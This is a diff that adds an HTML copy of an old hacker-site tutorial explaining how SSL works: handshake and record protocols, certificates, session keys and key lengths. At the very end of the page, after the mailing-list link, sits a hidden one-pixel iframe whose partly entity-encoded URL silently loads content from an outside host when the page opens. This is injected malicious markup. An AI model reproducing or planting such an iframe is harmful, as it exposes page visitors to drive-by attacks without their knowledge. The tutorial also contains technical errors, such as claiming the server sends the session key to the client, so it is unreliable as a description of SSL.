@@ -1,0 +1,56 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
+<META NAME="Generator" CONTENT="Microsoft Word 97">
+<TITLE>Hacking Truths: What they don't teach you in Manuals!!!!</TITLE>
+<META NAME="Template" CONTENT="C:\PROGRAM FILES\MICROSOFT OFFICE\OFFICE\html.dot">
+</HEAD>
+<BODY LINK="#0000ff" VLINK="#800080">
+
+<FONT SIZE=2><P>______________________________________________________________</P>
+<P>Secure Sockets Layer or SSL Torn Apart By Ankit Fadia </FONT><A HREF="mailto:ankit@bol.net.in"><FONT SIZE=2>ankit@bol.net.in</FONT></A></P>
+<FONT SIZE=2><P>_______________________________________________________________</P>
+<P>Secure Sockets Layer or SSL is a secure protocol, which is the reason why secure E-Commerce and E-Banking is possible. It has become the de facto standard for secure and safe only transactions. When Netscape first developed SSL, the main aim or motive behind it was to ensure that the client and host can communicate or transfer data and information securely.</P>
+<P>What SSL does in short would be, encrypt data at the sender’s end and decrypt data at the receiver’s end. This encrypted data cannot be picked up or hijacked in between and any tampering would not only be very difficult, it would easily be detected. Not only that, SSL also provides for two-way authentication i.e. verification of the client’s and the server’s identity.</P>
+<P>The various functions or features of SSL can be divided into three main categories-:</P>
+<OL>
+
+<LI>SSL Encrypted Connection-: Provides for secure and safe transaction of encrypted data between the client and the host.</LI>
+<LI>SSL Client Authentication: is an optional feature, which allows for verification of the client’s identity. </LI>
+<LI>SSL server Authentication: provides for verification of the server’s Certificate Authority (CA) which is nothing but a trusted safe host certificate given to the server by companies like Verisign, Cybertrust, Thawte and more.</LI></OL>
+
+<P>The main SSL protocol is made up of two smaller sub-protocols-:</P>
+<OL>
+
+<LI>The Secure Sockets Layer Record Protocol or The SSL Record Protocol.</LI>
+<LI>The Secure Sockets Layer Handshake Protocol or The SSL Handshake Protocol.</LI></OL>
+
+<P>The SSL Record Protocol looks after the transmission and the transmission format of the encrypted data. Also it is this sub-protocol of SSL, which ensures data integrity in the transfer process. On the other hand the SSL Handshake protocol basically helps to determine the session key. To understand both these protocols better, read on.</P>
+<P>****************</P>
+<P>Hacking truth: A session key is a secret symmetrical key, which is used to encrypt data, after a SSL connection has been established between the client and the host.</P>
+<P>****************</P>
+<P>Secure Sockets Layer: The Working</P>
+<P>Now as soon as you enter a secure site, SSL comes into play. But how do you know whether the connection is secure or not? Well, there are several things, which reveal the fact that whether your connection is unsafe or safe. </P>
+<P>The most common way to check whether your connection is secure or not is to look at the status bar of your browser. If you see a closed padlock, then the connection is secure, else if you see a open padlock, then the connection is not secure. Another area to watch out for is the browser URL box. Now on an unsecured connection you will see only a http:// before the other part of the URL of the site you are visiting. On the other hand, if the connection is secure then you will see a https:// instead.</P>
+<P>Another technique to ensure that you are on a secure connection is to have a look at the Certificate Authority or CA or the server. How do I do that? Well, simply right click on the page that you suspect to be on a unsecured connection, and select Properties. A properties box pops up. Now look for the Connection field. A typical Connection field would be as follows-:</P>
+<P>SSL 3.0, DES with 40 bit Encryption [Low]; RSA with 128 bit exchange.</P>
+<P>This means that SSL 3.0 is running, DES is the crypto system being used and it has 40-bit encryption level. And RSA is the public key encryption algorithm being used and in this case it used 128 bits.</P>
+<P>Anyway, let me start from what happens, once you are already on a secure connection. Now as soon as the browser knows that a secure connection is present, The SSL Handshake Protocol jumps into action. It sends the browser’s SSL version number, Encryption settings and other crypto information to the remote host. Once the remote server receives this, it in turn sends back to the client, its SSL number and cipher settings.</P>
+<P>Also, if the server wants to, then this is the time when it verifies the client’s certificate. [This is done only if </P>
+<P>an optional SSL feature, The SSL Client Authentication feature is present.] </P>
+<P>NOTE: Client Authentication can also be done at a later stage. It basically varies from Server to server, as to when this authentication is done, or whether it is done at all.</P>
+<P>Then, the client verifies the server’s Certificate Authority. This is done to ensure that the public key received by the client is that of the correct authentic server. If the server does not have a CA certificate or if the certificate has expired, then a dialog box pops up informing the user. [Warning the user]</P>
+<P>Once the server’s identity has been authenticated, then the client creates a ‘Premaster Secret’ which is unique for each new SSL session. This ‘Premaster Secret’ is then encrypted using the server’s Public Key and this encrypted Premaster secret is then sent to the server. The important thing to note here is that the Server’s Public Key is extracted from the server’s Digital Certificate, which is nothing but a digitally signed certificate containing the owner’s public key.</P>
+<P>Now, when the server receives the encrypted premaster secret, it verifies the client’s identity. [This is optional and varies from server to server] Anyway, Once the client’s identity has been authenticated, the server uses its private key to decrypt the premaster secret, to obtain the master secret. This master secret is used to determine the session key.</P>
+<P>Note: The transfer of the premaster and master is also done for compatibility reasons. </P>
+<P>Now, everything till now is handled by The SSL Handshake Protocol. Once all this is done, The SSL Record Protocol comes into the picture. Now, once the server has determined, the symmetrical session key, it sends it to the client and further communication is done using this session key. As the key is symmetrical, it can be used for both decrypting and encrypting purposes. The SSL Record Protocol handles all data transfer</P>
+<P>A typical SSL transaction involves various encryption algorithms like RSA and DSS. Other popular ones are DES and RC4. Data integrity is ensured by using ciphers like MD5, SHA etc, which are called Message Authentication Codes or MAC. A MAC is nothing but a checksum authentication thingy which converts the data into digits. The checksum value at the receiver’s end is compared to that at the sender’s end. If any tampering If any tampering is done or in other words, if the checksums do not match, then that particular session is considered void and the entire above process if repeated i.e. data is transmitted again.</P>
+<P>However, SSL is not as secure as it seems to be. The problem lies in the fact that the encryption algorithms used along with SLL are quite lame and can easily be cracked. All versions below 3.0 have been cracked, however SSL 3.0 with 128 bits would take a very very long time to crack, if it could be cracked. So it is quite same to a certain extend.</P>
+<P>So how do you ensure that your SSL transaction is secure? Well, the best thing to do is to use 128-Bit encryption instead of 40-Bit. The former has 3 * 10<SUP>26</SUP> more keys than the latter. Also install the latest version of your browsers, to ensure that you have the latest encryption standards and security patches.</P>
+<P>NOTE: 168-Bit encryption is present too, however, encryption levels over 40 bits are not allowed outside the US.</P>
+<P>Ankit Fadia</P>
+</FONT><P><A HREF="mailto:Ankit@bol.net.in"><FONT SIZE=2>ankit@bol.net.in</FONT></A></P>
+<FONT SIZE=2><P>To receive tutorials on Everything your Dreamt Of written by Ankit Fadia, join his mailing list by sending an email to:</P>
+</FONT><P><A HREF="mailto:programmingforhackers-subscribe@egroups.com"><FONT SIZE=2>programmingforhackers-subscribe@egroups.com</FONT></A></P><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
